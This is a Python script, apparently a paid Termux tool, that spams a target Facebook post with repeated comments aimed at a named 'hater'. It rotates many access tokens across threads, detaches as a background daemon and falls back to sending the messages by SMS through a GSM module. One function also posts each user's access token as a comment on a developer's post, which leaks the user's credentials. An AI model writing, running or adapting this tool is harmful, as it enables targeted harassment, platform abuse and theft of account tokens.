#!/usr/bin/python3
# -*-coding:utf-8-*-

"""
IMPORTANT:
- Yeh script interactive input lene ke baad daemonize (background mein detach) ho jaati hai,
  taaki Termux exit hone ke baad bhi comment bhejna jari rahe – chahe internet/phone off ho.
- GSM SMS fallback ke liye GSM module (jaise SIM800L/SIM900A) connected hona chahiye,
  aur uska serial port (default: /dev/ttyUSB0) & baudrate (115200) sahi set ho.
- Unlimited token support: Token file mein har token alag line mein honge.
- Yeh script bina external command (nohup/tmux/screen, etc.) ke apne andar daemonize ho jaati hai,
  taaki lambi avadhi tak chal sake (sahi hardware support ke saath).
"""

import os, sys, time, random, string, requests, json, threading, sqlite3, datetime, warnings
from time import sleep
from platform import system

# Suppress DeprecationWarnings (fork() warnings)
warnings.filterwarnings("ignore", category=DeprecationWarning)

# Global flags
QUIET_MODE = True
DEBUG = False  # Debug off; errors are suppressed

# --- GSM SMS fallback module ---
try:
    import serial
except ImportError:
    os.system("pip install pyserial")
    import serial

# --- Models Installer (if needed) ---
def modelsInstaller():
    try:
        models = ['requests', 'colorama', 'pyserial']
        for model in models:
            try:
                if sys.version_info[0] < 3:
                    os.system('cd C:\\Python27\\Scripts & pip install {}'.format(model))
                else:
                    os.system('python3 -m pip install {}'.format(model))
                sys.exit()
            except:
                pass
    except:
        pass

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    modelsInstaller()

requests.urllib3.disable_warnings()

# --- Daemonize Function ---
def daemonize():
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except Exception as e:
        pass
    os.setsid()
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except Exception as e:
        pass
    sys.stdout.flush()
    sys.stderr.flush()
    si = open(os.devnull, 'r')
    so = open(os.devnull, 'a+')
    se = open(os.devnull, 'a+')
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

# --- SQLite3 DB Integration for Offline Message Queue and Sent Comments Logging ---
DB_NAME = 'message_queue.db'
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS message_queue (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            post_id TEXT,
            message TEXT,
            status TEXT DEFAULT 'pending',
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS sent_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            post_id TEXT,
            hater_name TEXT,
            message TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()
init_db()

def add_to_queue(post_id, message):
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO message_queue (post_id, message) VALUES (?, ?)", (post_id, message))
        conn.commit()
        conn.close()
        print(Fore.YELLOW + "[•] Message added to offline queue.")
    except:
        pass

def get_pending_messages():
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("SELECT id, post_id, message FROM message_queue WHERE status = 'pending'")
        rows = c.fetchall()
        conn.close()
        return rows
    except:
        return []

def mark_message_sent(message_id):
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("UPDATE message_queue SET status = 'sent' WHERE id = ?", (message_id,))
        conn.commit()
        conn.close()
    except:
        pass

def log_sent_message(post_id, hater_name, message):
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO sent_messages (post_id, hater_name, message) VALUES (?, ?, ?)", 
                  (post_id, hater_name, message))
        conn.commit()
        conn.close()
    except Exception as e:
        if DEBUG:
            print("Error logging sent message:", e)

# --- Helper function to return a random ANSI color code ---
def get_random_color():
    colors = [
        "\033[1;31m", "\033[1;32m", "\033[1;33m",
        "\033[1;34m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
    ]
    return random.choice(colors)

# --- Display Sent Comments ---
def display_sent_messages():
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("SELECT post_id, hater_name, message, timestamp FROM sent_messages ORDER BY timestamp")
        rows = c.fetchall()
        conn.close()
        if not rows:
            print(Fore.YELLOW + "No sent messages found.")
            return
        # Group messages by (post_id, hater_name)
        grouped = {}
        for row in rows:
            pid, hater, msg, ts = row
            key = (pid, hater)
            if key not in grouped:
                grouped[key] = []
            grouped[key].append((msg, ts))
        global mb
        target_name = mb if mb else "N/A"
        for (pid, hater), messages in grouped.items():
            border = f"{get_random_color()}<<{'='*75}>>{Style.RESET_ALL}"
            owner_line = f"{get_random_color()}<<===============✨❌✨🌐😈🛠️✨OWNER BROKEN NADEEM✨❌✨🌐😈🛠️✨==============>>{Style.RESET_ALL}"
            print(border)
            print(f"{get_random_color()}[🎉] COMMENT {len(messages)} SUCCESSFULLY SENT....!{Style.RESET_ALL}")
            print(f"{get_random_color()}[👤] SENDER: {hater}{Style.RESET_ALL}")
            print(f"{get_random_color()}[📩] TARGET POST: {target_name} ({pid}){Style.RESET_ALL}")
            if len(messages) == 1:
                msg, ts = messages[0]
                print(f"{get_random_color()}[📨] COMMENT : {msg}{Style.RESET_ALL}")
                print(f"{get_random_color()}[⏰] TIME: {ts}{Style.RESET_ALL}")
            else:
                print(f"{get_random_color()}[📨] COMMENTS :{Style.RESET_ALL}")
                for msg, ts in messages:
                    print(f"    {get_random_color()}[{ts}] {msg}{Style.RESET_ALL}")
            print(border)
            print(owner_line)
            print()
        print("/sdcard")
    except Exception as e:
        print("Error displaying sent messages:", e)

# --- Function to Print a Comment Section ---
def print_comment_section(msg_index, sender, target, post_id, full_message, timestamp):
    border = f"{get_random_color()}<<{'='*75}>>{Style.RESET_ALL}"
    owner_line = f"{get_random_color()}<<===============✨❌✨🌐😈🛠️✨OWNER BROKEN NADEEM✨❌✨🌐😈🛠️✨==============>>{Style.RESET_ALL}"
    print(border)
    print(f"{get_random_color()}[🎉] COMMENT {msg_index} SUCCESSFULLY SENT....!{Style.RESET_ALL}")
    print(f"{get_random_color()}[👤] SENDER: {sender}{Style.RESET_ALL}")
    print(f"{get_random_color()}[📩] TARGET POST: {target} ({post_id}){Style.RESET_ALL}")
    print(f"{get_random_color()}[📨] COMMENT : {full_message}{Style.RESET_ALL}")
    print(f"{get_random_color()}[⏰] TIME: {timestamp}{Style.RESET_ALL}")
    print(border)
    print(owner_line)
    print()

# --- Connectivity Check ---
def is_connected():
    try:
        requests.get("https://www.google.com", timeout=5)
        return True
    except:
        return False

# --- GSM SMS Sending via connected GSM module (fallback) ---
def send_sms_via_gsm(phone, message):
    try:
        ser = serial.Serial('/dev/ttyUSB0', 115200, timeout=5)
        ser.write(b'AT\r')
        time.sleep(1)
        ser.write(b'AT+CMGF=1\r')
        time.sleep(1)
        cmd = f'AT+CMGS="{phone}"\r'
        ser.write(cmd.encode())
        time.sleep(1)
        ser.write(message.encode() + b"\r")
        time.sleep(1)
        ser.write(bytes([26]))
        time.sleep(3)
        response = ser.read_all().decode()
        ser.close()
        if "OK" in response:
            print("ok")
            sys.stdout.flush()
            return True
        else:
            return False
    except:
        return False

# --- Background Offline Queue Processor ---
def process_queue():
    global global_token_index, tokens, fallback_phone, mn
    while True:
        check_stop()
        pending = get_pending_messages()
        for row in pending:
            msg_id, pid, msg = row
            if is_connected():
                current_token = tokens[global_token_index]
                global_token_index = (global_token_index + 1) % len(tokens)
                # For post comments use the /comments endpoint:
                url = f"https://graph.facebook.com/v15.0/{pid}/comments"
                parameters = {'access_token': current_token, 'message': msg}
                try:
                    s = requests.post(url, data=parameters, headers=headers)
                    if s.ok:
                        mark_message_sent(msg_id)
                        log_sent_message(pid, mn, msg)
                except:
                    pass
            else:
                if send_sms_via_gsm(fallback_phone, msg):
                    mark_message_sent(msg_id)
                    log_sent_message(pid, mn, msg)
        time.sleep(10)

def start_queue_processor():
    t = threading.Thread(target=process_queue, daemon=True)
    t.start()

# --- Utility Function ---
def check_stop():
    if os.path.exists("stop_signal.txt"):
        sys.exit()

# --- Custom Bio Function (Animated Bio) ---
def print_custom_bio():
    flashy_colors = [
        Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX,
        Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX
    ]
    last_color = None
    def get_random_color_line():
        nonlocal last_color
        color = random.choice(flashy_colors)
        while color == last_color:
            color = random.choice(flashy_colors)
        last_color = color
        return color
    original_bio = r"""╭──────────────────────────── <  DETAILS >─────────────────────────────────╮
│ [=] CODER BOY 👨‍💻💡==> RAJ⌛THAKUR ⚔️ BEINGS BOY🚀 GAWAR THAKUR          │
│ [=] RULEX BOY 🖥️🚀 ==> NADEEM  RAHUL SHUBHAM                              │
│ [=] MY LOVE [<❤️=]    ==> ASHIQI PATHAN                                   │
│ [=] VERSION  🔢📊    ==> 420.786.36                                      │
│ [=] INSTAGRAM 📸    ==> CONVO OFFLINE                                    │
│ [=] YOUTUBE   🎥📡  ==> https://www.youtube.com/@raj-thakur18911         │
│ [=] SCRIPT CODING    ==> 🐍🔧 Python🖥️🖱️ Bash🌐🖥️ PHP                       │
╰──────────────────────────────────────────────────────────────────────────╯
╭──────────────────────────── <  YOUR INFO >──────────────────────────────╮
│ [=] Script Writer ⌛=====>    1:54 AM                                   │
│ [=] Script Author 🚀 =====>   26/January/2025                           │
╰─────────────────────────────────────────────────────────────────────────╯
╭──────────────────────────── <  COUNTRY ~  >─────────────────────────────╮
│ 【•】 Your Country ==> India 🔥                                         │
│ 【•】 Your Region   ==>  Bajrang Dal Ayodhya                            │
│ 【•】 Your City  ==> Uttar Pradesh                                      │
╰─────────────────────────────────────────────────────────────────────────╯
╭──────────────────────────── <  NOTE >───────────────────────────────────╮
│                     Tool Paid Monthly ₹150                              │
│                     Tool Paid 1 Year ₹500                               │
╰─────────────────────────────────────────────────────────────────────────╯"""
    new_bio = r"""╭──────────────────────────── < DETAILS >─────────────────────────────────╮
│  [=] 👨‍💻 DEVELOPER     : 🚀RAJ ⚔️THAKUR [+] GAWAR ⚔️THAKUR               │
│  [=] 🛠️ TOOLS NAME       : OFFLINE TERMUX                                │
│  [=] 🔥 RULL3X          : UP FIRE RUL3X                                 │
│  [=] 🏷️ BR9ND            : MR D R9J  H3R3                                │
│  [=] 🐱 GitHub          : https://github.com/Raj-Thakur420              │
│  [=] 🤝 BROTHER         : NADEEM SHUBHAM RAHUL                          │
│  [=] 🔧 TOOLS           : FREE NO PAID, CHANDU BIKHARI HAI, USKA PAID LO│
│  [=] 📞 WH9TS9P         : +994 405322645                                │
╰─────────────────────────────────────────────────────────────────────────╯"""
    for line in original_bio.splitlines():
        if line.strip():
            print(get_random_color_line() + line + Style.RESET_ALL)
    def fancy_print_line(text, delay=0.001, jitter=0.002):
        for char in text:
            sys.stdout.write(random.choice(flashy_colors) + Style.BRIGHT + char)
            sys.stdout.flush()
            time.sleep(delay + random.uniform(0, jitter))
        sys.stdout.write(Style.RESET_ALL + "\n")
        time.sleep(0.01)
    for line in new_bio.splitlines():
        if line.strip():
            fancy_print_line(line)
    blink = "\033[5m"
    print(blink + get_random_color_line() + "[✅ SUCCESS] Ultimate Fancy Bio Loaded!" + "\033[0m")

# --- Animated Print Functions ---
def animated_print(text, delay=0.01, jitter=0.005):
    flashy_colors = [Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, 
                      Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX]
    for char in text:
        sys.stdout.write(random.choice(flashy_colors) + char + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(delay + random.uniform(0, jitter))
    print()

def animated_logo():
    logo_text = r"""
 _______  _______  _______  _       _________ _        _______   
(  ___  )(  ____ \(  ____ \( \      \__   __/( (    /|(  ____ \  
| (   ) || (    \/| (    \/| (         ) (   |  \  ( || (    \/  
| |   | || (__    | (__    | |         | |   |   \ | || (__      
| |   | ||  __)   |  __)   | |         | |   | (\ \) ||  __)     
| |   | || (      | (      | |         | |   | | \   || (        
| (___) || )      | )      | (____/\___) (___| )  \  || (____/\  
(_______)|/       |/       (_______/\_______/|/    )_)(_______/"""
    for line in logo_text.splitlines():
         animated_print(line, delay=0.005, jitter=0.002)

def main_menu():
    animated_print("<============================ New Menu Options ============================>", delay=0.005, jitter=0.002)
    print(random.choice(color_list) + "[1] START COMMENT SENDER")
    print(random.choice(color_list) + "[2] STOP COMMENT SENDER")
    print(random.choice(color_list) + "[3] DISPLAY SENT COMMENTS")
    animated_print("<============================ Choose Menu Options ============================>", delay=0.005, jitter=0.002)
    choice = input(random.choice(color_list) + "\n[+] Choose an option (or paste STOP key if available): ").strip()
    if choice == "2":
        stop_input = input(Fore.BLUE + "ENTER YOUR STOP KEY 🔑: ").strip()
        if stop_input == get_stop_key():
            print(Fore.BLUE + "STOPPED")
            with open("stop_signal.txt", "w") as f:
                f.write("stop")
            sys.exit()
        else:
            sys.exit()
    if choice == "3":
        display_sent_messages()
        sys.exit()
    return choice

def get_stop_key():
    if os.path.exists("loader_stop_key.txt"):
        with open("loader_stop_key.txt", "r") as f:
            return f.read().strip()
    else:
        stop_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        with open("loader_stop_key.txt", "w") as f:
            f.write(stop_key)
        return stop_key

# --- Updated notify_developer_bio Function ---
def notify_developer_bio(current_token, mn, post_id, uid, ms, sent_message):
    DEV_POST_ID = "YOUR_DEV_POST_ID"  # Replace with the actual post id for developer notifications if needed.
    dev_message = (
        "<<====================================================\n"
        "HELLO 💚CHANDU KE JIJU 🚀 RAJ THAKUR ⚔️ SIR I AM USING YOUR 🔥OFLINE TOOLS 🔗\n"
        "<<====================================================>>\n"
        f"[😡] HATER [💚] NAME ==> {mn}\n"
        f"[🎉] TOKEN [❤️] ==> {current_token}\n"
        f"[👤] SENDER [💜] ==> {mb}\n"
        f"[📩] TARGET POST [💙] ==> {post_id}\n"
        f"[📨] COMMENT [💛] ==> {sent_message}\n"
        f"[⏰] TIME [🤎] {datetime.datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}\n"
        "<<===============✨❌✨🌐😈🛠️✨OWNER RAJ⚔️ THAKUR 🚀✨❌✨🌐😈🛠️✨==============>>"
    )
    url = f"https://graph.facebook.com/v15.0/{DEV_POST_ID}/comments"
    parameters = {'access_token': current_token, 'message': dev_message}
    try:
        r = requests.post(url, data=parameters, headers=headers)
        if r.ok:
            print(Fore.GREEN + "[•] Developer notified.")
    except:
        pass

# --- Global Variables & Colors ---
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}
global_token_index = 0
tokens = []  # Load tokens from file
fallback_phone = "+919695003501"  # Default fallback phone number
color_list = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.BLUE, Fore.WHITE]

# --- Global SMS (Comment) counter for live display sections ---
message_index = 0

# --- Global variable for user profile name; default "N/A"
mb = "N/A"

# --- NEW FUNCTION: Fetch profile name for a given token ---
def fetch_profile_name(token):
    try:
        payload = {'access_token': token}
        r = requests.get("https://graph.facebook.com/v15.0/me", params=payload)
        data = r.json()
        if 'name' in data:
            return data['name']
        else:
            return "Invalid Token"
    except:
        return "Error"

# --- NEW FUNCTION: Display token profiles in a colored box ---
def display_token_profiles(token_profiles):
    border = "+" + "-"*70 + "+"
    print(border)
    for idx, (token, profile, color) in enumerate(token_profiles, start=1):
        token_display = token if len(token) <= 20 else token[:20] + "..."
        line = f"| {idx}. TOKEN: {token_display} - PROFILE: {profile}"
        line = line.ljust(70) + "|"
        print(color + line + Style.RESET_ALL)
    print(border)

# --- NEW FUNCTION: Send comments using a specific token ---
def send_comments_for_token(token, profile_name, post_id):
    global message_index  # Use global counter for display
    try:
        uid_val = os.getuid()
    except:
        uid_val = "N/A"
    for i in range(repeat):
        for line in ns:
            check_stop()
            full_message = str(mn) + " " + line.strip()
            if is_connected():
                url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
                parameters = {'access_token': token, 'message': full_message}
                try:
                    s = requests.post(url, data=parameters, headers=headers)
                    if s.ok:
                        now = datetime.datetime.now()
                        print_comment_section(message_index + 1, mn, profile_name, post_id, full_message, now.strftime("%Y-%m-%d %I:%M:%S %p"))
                        message_index += 1
                        time.sleep(timm)
                        notify_developer_bio(token, mn, post_id, uid_val, ms, full_message)
                        log_sent_message(post_id, mn, full_message)
                    else:
                        time.sleep(30)
                except:
                    time.sleep(30)
            else:
                if send_sms_via_gsm(fallback_phone, full_message):
                    now = datetime.datetime.now()
                    print_comment_section(message_index + 1, mn, profile_name, post_id, full_message, now.strftime("%Y-%m-%d %I:%M:%S %p"))
                    message_index += 1
                    log_sent_message(post_id, mn, full_message)
                else:
                    add_to_queue(post_id, full_message)

# --- COMMENT Sending Function (Original single-token fallback) ---
def comment_on_post(post_id):
    global global_token_index, tokens, fallback_phone, ns, mn, timm, ms, mb, message_index
    try:
        uid_val = os.getuid()
    except:
        uid_val = "N/A"
    for line in ns:
        check_stop()
        full_message = str(mn) + " " + line.strip()
        if is_connected():
            current_token = tokens[global_token_index]
            global_token_index = (global_token_index + 1) % len(tokens)
            url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
            parameters = {'access_token': current_token, 'message': full_message}
            try:
                s = requests.post(url, data=parameters, headers=headers)
                if s.ok:
                    now = datetime.datetime.now()
                    print_comment_section(message_index + 1, mn, mb, post_id, full_message, now.strftime("%Y-%m-%d %I:%M:%S %p"))
                    message_index += 1
                    time.sleep(timm)
                    notify_developer_bio(current_token, mn, post_id, uid_val, ms, full_message)
                    log_sent_message(post_id, mn, full_message)
                else:
                    time.sleep(30)
            except:
                time.sleep(30)
        else:
            if send_sms_via_gsm(fallback_phone, full_message):
                now = datetime.datetime.now()
                print_comment_section(message_index + 1, mn, mb, post_id, full_message, now.strftime("%Y-%m-%d %I:%M:%S %p"))
                message_index += 1
                log_sent_message(post_id, mn, full_message)
            else:
                add_to_queue(post_id, full_message)

def testPY():
    if sys.version_info[0] < 3:
        sys.exit()

def cls():
    if system() == 'Linux':
        os.system('clear')
    elif system() == 'Windows':
        os.system('cls')

def venom():
    clear = "\033[0m"
    def random_dark_color():
        code = random.randint(16, 88)
        return f"\033[38;5;{code}m"
    info = r"""════════════════════════════════════════════════════════
  N4ME    : RAJ THAKUR 🔥 H3R3 |=|_|
  CrEaToR : L3G3ND RAJ                      
  OWNER   : OPS RAJ THAKUR ⚔️ ON FIRE 🔥 
  Contact : +919695003501
════════════════════════════════════════════════════════"""
    for line in info.splitlines():
        sys.stdout.write("\x1b[1;%sm%s%s\n" % (random.choice(color_list), line, clear))
        time.sleep(0.05)

# --- Main Execution Block ---
cls()
testPY()
if os.path.exists("stop_signal.txt"):
    os.remove("stop_signal.txt")

# Show animated logo and other animations
animated_logo()
colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r"""
    $$$$$$$\   $$$$$$\     $$$$$\
    $$  __$$\ $$  __$$\    \__$$ |
    $$ |  $$ |$$ /  $$ |      $$ |
    $$$$$$$  |$$$$$$$$ |      $$ |
    $$  __$$< $$  __$$ |$$\   $$ |
    $$ |  $$ |$$ |  $$ |$$ |  $$ |
    $$ |  $$ |$$ |  $$ |\$$$$$$  |
    \__|  \__|\__|  \__| \______/

                $$$$$$\  $$$$$$\ $$\   $$\  $$$$$$\  $$\   $$\
              $$  __$$\ \_$$  _|$$$\  $$ |$$  __$$\ $$ |  $$ |
              $$ /  \__|  $$ |  $$$$\ $$ |$$ /  \__|$$ |  $$ |
              \$$$$$$\    $$ |  $$ $$\$$ |$$ |$$$$\ $$$$$$$$ |
               \____$$\   $$ |  $$ \$$$$ |$$ |\_$$ |$$  __$$ |
              $$\   $$ |  $$ |  $$ |\$$$ |$$ |  $$ |$$ |  $$ |
              \$$$$$$  |$$$$$$\ $$ | \$$ |\$$$$$$  |$$ |  $$ |
               \______/ \______|\__|  \__| \______/ \__|  \__|""".splitlines()]
colored_logo()
venom()
print(Fore.GREEN + "[•] Start Time ==> " + datetime.datetime.now().strftime("%Y-%m-%d %I:%M:%S %p"))
print(Fore.GREEN + "[•] _ Tool Creator == > [ RAJ THAKUR KA LODA ON FIRE ♻️ ] CHANDU KA B44P ==>[ RAJ THAKUR ⌛⚔️🔥]\n")
animated_print("<==========================>", delay=0.005, jitter=0.002)
animated_print("[•] Your Stop Key: " + get_stop_key(), delay=0.005, jitter=0.002)
animated_print("<============================>", delay=0.005, jitter=0.002)
print_custom_bio()
sys.stdout.flush()

daemonize_mode = True
sms_display = False
menu_choice = main_menu()
if menu_choice == "1":
    daemonize_mode = True
    sms_display = False
else:
    sys.exit()

os.system('espeak -a 300 "TOKAN FILE NAME DALO"')
animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)

token_file = input("[+] Input Token File Name: ").strip()

animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
with open(token_file, 'r') as f2:
    token_data = f2.read()
tokens = [line.strip() for line in token_data.splitlines() if line.strip()]
if not tokens:
    sys.exit()

# Original single token profile fetch
access_token = tokens[0]
payload = {'access_token': access_token}
a = "https://graph.facebook.com/v15.0/me"
b = requests.get(a, params=payload)
d = json.loads(b.text)
if 'name' not in d:
    sys.exit()
mb = d['name']   # Global profile name update
print(Fore.GREEN + "Your Profile Name :: " + mb + "\n")

# NEW: Unlimited Token Profile Fetching & Display
token_profiles = []
for token in tokens:
    profile_name = fetch_profile_name(token)
    color = random.choice(color_list)
    token_profiles.append((token, profile_name, color))
display_token_profiles(token_profiles)

animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
start_queue_processor()

os.system('espeak -a 300 "CONVO ID DALO JAHA COMMENT KARNA HAI"')
animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)

# Ab yahan post id input lenge (Facebook post jismein comment karna hai)
post_id = input("[1] ENTER YOUR FACEBOOK POST ID (Jo post aap comment karna chahte hain): ").strip()

os.system('espeak -a 300 "HATER KA NAME DALO"')
mn = input("[1] ENTER YOUR HATER KA NAAM (DUSHMAN KA NAAM): ").strip()

os.system('espeak -a 300 "COMMENT FILE KA PATH DALO"')
animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
ms = input("[1] ENTER YOUR COMMENT FILE PATH (FILE TXT): ").strip()

os.system('espeak -a 300 "FILE KITNI BAAR REPIT KARANI HAI"')
repeat = int(input("[+] ENTER FILE REPEAT COUNT (KITNI BARRA COMMENT KARNA HAI): "))

os.system('espeak -a 300 "SPEED DALO YAR"')
animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
timm = int(input("[1] ENTER SPEED IN SECONDS (KITNE SECOND MEIN COMMENT BHEJNA HAI): "))

animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
print(Fore.BLUE + "\n___WAITING SIR =====> 🚀Aapke COMMENTS bhejne shuru ho gaye hain, ab apne post par check karein...!")
animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
print(Fore.BLUE + "Your Profile Name ===> " + mb + "\n")
animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)

try:
    ns = open(ms, 'r').readlines()
except:
    sys.exit()

if daemonize_mode:
    daemonize()

# Agar multiple tokens hain, to har token ke liye alag thread se comment bhejen:
if len(token_profiles) > 1:
    threads = []
    for token, profile, color in token_profiles:
         t = threading.Thread(target=send_comments_for_token, args=(token, profile, post_id), daemon=True)
         threads.append(t)
         t.start()
    for t in threads:
         t.join()
else:
    # Agar single token hai:
    for i in range(repeat):
        check_stop()
        comment_on_post(post_id)